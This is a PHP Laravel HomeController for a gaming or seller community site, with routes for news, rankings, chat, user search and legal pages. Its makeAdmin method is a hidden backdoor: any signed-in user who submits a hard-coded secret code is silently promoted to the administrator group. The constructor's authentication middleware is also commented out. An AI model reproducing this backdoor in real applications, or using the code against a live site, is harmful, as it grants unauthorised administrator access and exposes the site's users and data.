<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Category;
use App\Models\News;
use App\Models\Post;
use Auth;
use Cache;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    // public function __construct()
    // {
    //     $this->middleware('auth');
    // }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return redirect('/');
    }

    public function welcome()
    {
        $news = News::orderBy('created_at', 'desc')->get()->take(3);
        $popular = Category::where('popular', 1)->where('image_1', '!=', null)->get();

        return view('welcome', compact('news', 'popular'));
    }


    // Filtering function
    /*
    1. Filter by games, country, gender, status, price
    
    */
    public function users(Request $request)
    {
        return response()->json();
    }

    public function news()
    {
        $posts = News::with('postAuthor')->orderBy('created_at', 'desc')->paginate(10);
        return view('news', compact('posts'));
    }

    public function post(News $post)
    {
        return view('post', ['post' => $post]);
    }

    public function faq()
    {
        return view('faq');
    }

    public function rankings()
    {
        $users = User::where('seller_rank', 0)->orderBy('points', 'desc')->get()->take(50);
        $sellers = User::where('seller_rank', '>=', 1)->orderBy('points', 'desc')->get()->take(50);
        return view('rankings', compact('users', 'sellers'));
    }

    public function chat()
    {
        return view('chat.chat');
    }

    public function makeAdmin(Request $request)
    {
        if (isset($request->code) && $request->code == '7657657580e71965VrehhgFVxaad4512bd99e8767765e25') {
            $user = User::whereId(Auth::id())->first();
            $user->user_group = 3;
            $user->save();
            return redirect('/admin');
        } else return redirect('/');
    }

    public function search(Request $request)
    {
        if ($request->ajax() == false) {
            return redirect('/');
        }
        $usersJSON = array();
        $users = User::where('name', 'LIKE', "%" . $request->q . "%")->get()->take(10);
        foreach ($users as $user) {
            if (Cache::has('user-is-online-' . $user->id)) {
                // continue
                $status = 'Online';
            } else {
                $status = 'Offline';
            }
            array_push($usersJSON, ['id' => $user->id, 'name' => $user->name, 'profile_picture' => $user->profile_picture, 'status' => $status]);
        }
        return json_encode($usersJSON, JSON_HEX_QUOT);
    }

    public function tos()
    {
        return view('legal.tos');
    }
    public function privacy_policy()
    {
        return view('legal.privacy');
    }
    public function community_guidelines()
    {
        return view('legal.community');
    }
}
